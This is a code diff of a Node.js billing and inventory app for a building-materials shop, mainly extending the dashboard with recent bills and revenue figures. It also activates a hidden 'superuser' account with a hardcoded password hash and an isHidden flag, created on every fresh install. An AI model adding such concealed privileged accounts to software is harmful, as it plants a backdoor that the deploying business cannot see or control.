@@ -66,19 +66,19 @@ function initializeFreshSystem() {
             lastLogin: null
         });       
        
-        // const hashedSuperPassword = "$2b$10$GCa4iJEiCr/djxDdWahbpO5SS5PZMci9zKNGvX8mbTpoJqbl5ZjFy"
-        // dataManager.add('users', {
-        //     id: 'user_super',
-        //     username: 'superuser',
-        //     password: hashedSuperPassword,
-        //     role: 'super',
-        //     fullName: 'Super Administrator',
-        //     email: '',
-        //     status: 'active',
-        //     isHidden: true,
-        //     createdAt: new Date().toISOString(),
-        //     lastLogin: null
-        // });
+        const hashedSuperPassword = "$2b$10$GCa4iJEiCr/djxDdWahbpO5SS5PZMci9zKNGvX8mbTpoJqbl5ZjFy"
+        dataManager.add('users', {
+            id: 'user_super',
+            username: 'superuser',
+            password: hashedSuperPassword,
+            role: 'super',
+            fullName: 'Super Administrator',
+            email: '',
+            status: 'active',
+            isHidden: true,
+            createdAt: new Date().toISOString(),
+            lastLogin: null
+        });
         
         //console.log('✅ Default users created (including hidden super user)');
     }
@@ -616,7 +616,7 @@ function createDefaultItems() {
         { id: 'item_005', name: 'Steel Rod 16mm', categoryId: 'cat_001', price: 77.8, unit: 'kg', isTaxable: true, gstRate: 18, hsnCode: '7213', brand: 'JSW Steel', isServiceItem: false, priceEditableAtBilling: false, bundleInfo: 'Each bundle ≈ 49.5 kg per rod', stock: { quantity: 150, minLevel: 10 }, isActive: true, createdAt: '2025-01-01T00:00:00.000Z' },
         { id: 'item_006', name: 'Steel Rod 20mm', categoryId: 'cat_001', price: 78.5, unit: 'kg', isTaxable: true, gstRate: 18, hsnCode: '7213', brand: 'JSW Steel', isServiceItem: false, priceEditableAtBilling: false, bundleInfo: 'Each bundle ≈ 77.4 kg per rod', stock: { quantity: 100, minLevel: 8 }, isActive: true, createdAt: '2025-01-01T00:00:00.000Z' },
         { id: 'item_007', name: 'Steel Rod 25mm', categoryId: 'cat_001', price: 79.2, unit: 'kg', isTaxable: true, gstRate: 18, hsnCode: '7213', brand: 'JINDAL', isServiceItem: false, priceEditableAtBilling: false, bundleInfo: 'Each bundle ≈ 121 kg per rod', stock: { quantity: 80, minLevel: 5 }, isActive: true, createdAt: '2025-01-01T00:00:00.000Z' },
-        { id: 'item_008', name: 'Steel Rod 32mm', categoryId: 'cat_001', price: 80.0, unit: 'kg', isTaxable: true, gstRate: 18, hsnCode: '7213', brand: 'JINDAL', isServiceItem: false, priceEditableAtBilling: false, bundleInfo: 'Each bundle ≈ 198 kg per rod', stock: { quantity: 50, minLevel: 3 }, isActive: true, createdAt: '2025-01-01T00:00:00.000Z' },
+        { id: 'item_008', name: 'Steel Rod 32mm', categoryId: 'cat_001', price: 80.0, unit: 'kg', isTaxable: true, gstRate: 18, hsnCode: '7213', brand: 'JINDAL', isServiceItem: false, priceEditableAtBilling: false, bundleInfo: 'Each bundle ≈ 198 kg per rod', stock: { quantity: 1, minLevel: 3 }, isActive: true, createdAt: '2025-01-01T00:00:00.000Z' },
         
         // Cement Products
         { id: 'item_009', name: 'Ramco Cement OPC 53', categoryId: 'cat_002', price: 385, unit: 'bag', isTaxable: true, gstRate: 28, hsnCode: '2523', brand: 'Ramco', isServiceItem: false, priceEditableAtBilling: false, bundleInfo: '50 kg per bag', stock: { quantity: 300, minLevel: 50 }, isActive: true, createdAt: '2025-01-01T00:00:00.000Z' },
@@ -928,8 +928,34 @@ app.get('/dashboard', requireAuth, (req, res) => {
         
         // Calculate today's statistics
         const today = new Date().toISOString().split('T')[0];
-        const todaysBills = bills.filter(bill => bill.createdAt && bill.createdAt.split('T')[0] === today);
+        const todaysBills = bills.filter(bill => {
+            if (!bill.createdAt && !bill.billDate) return false;
+            const billDate = new Date(bill.createdAt || bill.billDate).toISOString().split('T')[0];
+            return billDate === today;
+        });
+        
         const todaysRevenue = todaysBills.reduce((sum, bill) => sum + (bill.finalTotal || bill.grandTotal || 0), 0);
+        
+        // Calculate total revenue (all time)
+        const totalRevenue = bills.reduce((sum, bill) => sum + (bill.finalTotal || bill.grandTotal || 0), 0);
+        
+        // Get recent bills (last 10 bills) with customer information
+        const recentBills = bills
+            .sort((a, b) => new Date(b.createdAt || b.billDate) - new Date(a.createdAt || a.billDate))
+            .slice(0, 10)
+            .map(bill => {
+                // Find customer name
+                const customer = customers.find(c => c.id === bill.customerId);
+                const customerName = customer ? customer.name : bill.customerName || 'Unknown Customer';
+                
+                return {
+                    _id: bill.id,
+                    billNumber: bill.billNumber,
+                    customerName: customerName,
+                    totalAmount: bill.finalTotal || bill.grandTotal || 0,
+                    date: new Date(bill.createdAt || bill.billDate).toLocaleDateString('en-IN')
+                };
+            });
         
         // Calculate low stock items
         const lowStockItems = items.filter(item => {
@@ -938,11 +964,20 @@ app.get('/dashboard', requireAuth, (req, res) => {
         });
         
         const dashboardData = {
+            // Current day statistics (matching dashboard.ejs expectations)
+            totalBills: todaysBills.length,           // Current day bills count
+            totalRevenue: todaysRevenue,              // Current day revenue
+            totalCustomers: customers.length,         // Total customers count
+            
+            // Additional stats for compatibility
             billsToday: todaysBills.length,
             itemsCount: items.length,
             customersCount: customers.length,
             revenueToday: todaysRevenue,
-            lowStockCount: lowStockItems.length
+            lowStockCount: lowStockItems.length,
+            
+            // Recent bills for the activity section
+            recentBills: recentBills
         };
         
         res.render('dashboard', { 
@@ -956,11 +991,15 @@ app.get('/dashboard', requireAuth, (req, res) => {
             user: req.session.user,
             title: `${res.locals.companyName} - Dashboard`,
             stats: {
+                totalBills: 0,
+                totalRevenue: 0,
+                totalCustomers: 0,
                 billsToday: 0,
                 itemsCount: 0,
                 customersCount: 0,
                 revenueToday: 0,
-                lowStockCount: 0
+                lowStockCount: 0,
+                recentBills: []
             }
         });
     }
